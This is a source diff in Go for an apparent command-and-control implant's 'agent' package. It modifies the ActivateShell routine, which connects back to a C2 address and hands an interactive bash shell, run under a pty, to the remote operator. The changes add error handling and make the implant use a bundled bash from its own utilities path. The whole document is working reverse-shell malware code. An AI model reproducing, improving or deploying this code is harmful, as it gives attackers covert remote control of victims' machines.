@@ -3,6 +3,7 @@ package agent
 import (
 	"bytes"
 	"context"
+	"errors"
 	"log"
 	"os"
 	"os/exec"
@@ -16,9 +17,8 @@ import (
 )
 
 // ActivateShell launch reverse shell and send it to CC
-func ActivateShell(token string) {
+func ActivateShell(token string) (err error) {
 	var (
-		err       error
 		rshellURL = CCAddress + tun.ReverseShellAPI
 		shellPID  = 0 // PID of the bash shell
 
@@ -31,6 +31,13 @@ func ActivateShell(token string) {
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
+
+	// check if we have utilities installed
+	if !IsFileExist(UtilsPath + "/bash") {
+		err = errors.New("ActivateShell: can't find bash in utilities, try module `vaccine`?")
+		log.Print(err)
+		return
+	}
 
 	// connect CC
 	conn, ctx, cancel, err = ConnectCC(rshellURL)
@@ -98,6 +105,7 @@ func ActivateShell(token string) {
 			}
 		}
 	}
+	return
 }
 
 // reverseShell - Execute a reverse shell to host
@@ -109,11 +117,7 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 	log.Printf("Sent token %s", token)
 
 	// shell command
-	shell := "bash"
-	if !IsCommandExist("bash") {
-		shell = "sh"
-	}
-	cmd := exec.Command(shell, "-i")
+	cmd := exec.Command(UtilsPath+"/bash", "-i")
 
 	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
 	shellf, err := pty.StartWithSize(cmd, &initWinSize)
